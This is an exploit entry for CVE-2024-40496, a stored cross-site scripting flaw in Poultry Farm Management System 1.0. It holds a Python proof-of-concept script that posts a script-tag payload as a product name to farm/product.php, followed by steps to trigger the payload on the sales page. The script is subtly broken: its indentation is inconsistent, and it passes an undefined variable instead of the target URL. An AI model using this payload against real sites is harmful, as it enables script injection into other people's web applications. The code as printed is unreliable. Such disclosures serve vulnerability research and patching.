# Exploit Title: Cross-Site-Scripting-vulnerability-in-Poultry-Farm-Management-System(stored)
# Date: 16-07-2024
# CVE: CVE-2024-40496
# Exploit Author: qiyu dobrik
# Vendor Homepage: https://www.sourcecodester.com/php/15230/poultry-farm-management-system-free-download.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/Redcock-Farm.zip
# Category: Web Application
# Version: 1.0
# Tested on: Windows 11
# Vulnerable endpoint: farm/product.php  farm/sell_product.php
# video


https://github.com/user-attachments/assets/21693a12-230a-4f0e-ae64-24875e457e97


# Exploit Code:
```

 import requests  
 from colorama import Fore, Style, init  
 init(autoreset=True)  

 def add_product(host):  
    add_url = f"{host}/farm/product.php"  
    # Prepare the payload  
    payload = {  
        'category': 'CHICKEN',  
        'product': '<script>alert(document.domain)</script>',  
        'price': '10',  
        'save': ''  
    }      

    try:
        print("Sending xss to:", add_url)
        proxies = {
         "http": "http://127.0.0.1:8080",
         "https": "http://127.0.0.1:8080",
        }
        response = requests.post(add_url,data=payload, verify=False) 
        
       if response.status_code == 200:
            print("\nResponse status code:", response.status_code)

       else:
            print(f"Failed to add xss. Status code: {response.status_code}")
 
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    target = "http://localhost/Redcock-Farm"  # Change this to your target
    add_product(host)
```   
# Execute   
```   
1.python xss.py or python3 xss.py   
2.visit sell_product page   
3.an alert box will appear   



            
